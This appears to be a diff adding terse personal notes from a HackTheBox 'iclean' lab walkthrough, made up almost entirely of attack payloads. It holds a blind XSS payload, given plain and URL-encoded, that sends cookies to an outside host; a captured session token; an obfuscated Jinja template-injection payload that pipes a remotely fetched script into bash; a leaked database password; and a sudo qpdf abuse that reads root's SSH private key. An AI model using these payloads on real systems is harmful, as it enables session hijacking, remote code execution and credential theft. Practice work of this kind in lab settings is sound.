@@ -1,0 +1,45 @@
+https://medium.com/@Null0X0/iclean-hackthebox-medium-machine-walkthrough-4deab6312558
+
+
+/quote diectory (blind XSS in quote session)
+
+<img src=x onerror=this.src="http://10.10.14.62:8001/"+btoa(document.cookie)>
+
+service=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%74%68%69%73%2e%73%72%63%3d%22%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%36%32%3a%38%30%30%31%2f%22%2b%62%74%6f%61%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3e%0a&email=jsfjdsl%40gmail.com
+
+#php -S 0.0.0.0:8001
+
+c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlppaURZdy5UX2daQWRxdTYxQ3pzcFdSR1RaeDJtd0EwS0k=
+
+
+session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZiiDYw.T_gZAdqu61CzspWRGTZx2mwA0KI
+
+
+Invoice-ID = 3584831575
+
+
+{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('curl 10.10.14.62:8001/exploit.sh|bash',shell=True,stdout=-1).communicate()}}
+
+
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+
+
+simple and clean
+
+
+04c7c779e87fe9a1a18774dc53d02858
+
+
+
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+
+sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --
+
+
+02d6c27a665929f75b859af7e3eb8d35
